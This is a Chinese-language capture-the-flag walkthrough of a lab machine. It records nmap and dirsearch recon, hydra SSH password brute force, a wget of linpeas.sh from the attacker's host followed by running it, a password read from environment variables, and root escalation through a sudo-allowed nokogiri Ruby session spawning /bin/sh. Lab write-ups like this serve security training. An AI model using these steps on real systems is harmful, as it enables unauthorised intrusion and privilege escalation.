## 复盘*

## 靶机地址

[Proton Drive](https://drive.proton.me/urls/7RQNZXS5JW#0fnRqJ2q92i9)

![image-20250324085343428](./assets/image-20250324085343428.png)



## 信息收集

### nmap扫描

#### 准备阶段

```
mkdir nmapscan
```

创建文件夹，用于存放nmap扫描结果



#### 主机探测

```
nmap -sn 192.168.23.0/24
```

![image-20250324085449763](./assets/image-20250324085449763.png)

确定靶机ip：

192.168.23.142



#### 端口扫描

```
nmap -p- --min-rate 10000 -sT 192.168.23.142 -oA ./nmapscan/ports
```

![image-20250324085529896](./assets/image-20250324085529896.png)

开放了：

- 22 ssh
- 80 http



#### 提取端口信息

```
ports
```

![image-20250324085601197](./assets/image-20250324085601197.png)



#### 详细结果扫描

```
nmap -sC -sV -sT -O -p 22,80 192.168.23.142 -oA ./nmapscan/detail
```

![image-20250324085640876](./assets/image-20250324085640876.png)

分析：

- 22 ssh Open SSH 8.4.p1
- 80 http Apache httpd 2.4.56



#### udp扫描

```
nmap -sU --top-ports 20 192.168.23.142 ./nmapscan/udp
```

![image-20250324085812544](./assets/image-20250324085812544.png)



### 80端口

#### 访问192.168.23.142

![image-20250324085919461](./assets/image-20250324085919461.png)

apache主页

查看源码，无信息



#### 目录扫描

```
dirsearch -u 192.168.23.142
```

![image-20250324090004555](./assets/image-20250324090004555.png)

![image-20250324090013498](./assets/image-20250324090013498.png)

存在info.php



#### 访问192.168.23.142/info.php

![image-20250324090043264](./assets/image-20250324090043264.png)

phpinfo信息

![image-20250324090138282](./assets/image-20250324090138282.png)

得到了一个用户

- axel



#### 尝试爆破密码

```
hydra -l axel -P /usr/share/wordlist/rockyou.txt ssh://192.168.23.142
```

![image-20250324090649126](./assets/image-20250324090649126.png)

得到

```
axel：bambam
```



### 22端口

#### ssh登录

```
ssh axel@192.168.23.142
```

![image-20250324090737168](./assets/image-20250324090737168.png)





## 提权

### 得到第一个flag

```
ls
cat user.txt
```

![image-20250324090800495](./assets/image-20250324090800495.png)



### 查看/etc/passwd

```
cat /etc/passwd
```

![image-20250324090855369](./assets/image-20250324090855369.png)

存在dylan用户

尝试进入dylan家目录

```
ls
cd dylan
```

![image-20250324090924851](./assets/image-20250324090924851.png)

失败



### 上传linpeas.sh

```
wget 192.168.23.134/linpeas.sh
chmod +x linpeas.sh
./linpeas.sh
```

![image-20250324091258974](./assets/image-20250324091258974.png)

![image-20250324091350200](./assets/image-20250324091350200.png)

![image-20250324091357868](./assets/image-20250324091357868.png)

### env中存在dylan的密码

```
dylan:bl4bl4Dyl4N
```

```
env|grep dylan
```

![image-20250324091522775](./assets/image-20250324091522775.png)



### 切换用户

```
su dylan
```

![image-20250324091555404](./assets/image-20250324091555404.png)



### 执行sudo -l

```
sudo -l
```

![image-20250324091620234](./assets/image-20250324091620234.png)

无密码执行nokogiri



### 利用nokogiri提权

#### 首先阅读nokogiri手册

```
man nokogiri
```

![image-20250324092452576](./assets/image-20250324092452576.png)

```
Nokogiri (鋸) 是一个用于解析 HTML、XML、SAX 的解析器。Nokogiri 的众多功能之一是能够通过 XPath 或 CSS3 选择器搜索文档。nokogiri 命令解析一个文档，并启动一个交互式 Ruby 会话 (irb(1))，允许用户交互式地分析结果。
```

interactive ruby session(irb(1))

即如果我们能够开启ruby会话，就可以尝试利用该会话提权



#### ruby执行命令的方法

![irbcommand示例](./assets/irbcommandexample.webp)





#### 首先创建一个文档

内容无所谓

```
vi 1
cat 1
```

![image-20250324092722282](./assets/image-20250324092722282.png)



#### 利用nokogiri解析该文档

![image-20250324092745832](./assets/image-20250324092745832.png)

进入ruby会话

```
system"id"
```

![image-20250324092843303](./assets/image-20250324092843303.png)

```
system"/bin/sh"
whoami
```

![image-20250324092922339](./assets/image-20250324092922339.png)



### 得到第二个flag

```
cd /root
ls
cat root.txt
```

![image-20250324092957896](./assets/image-20250324092957896.png)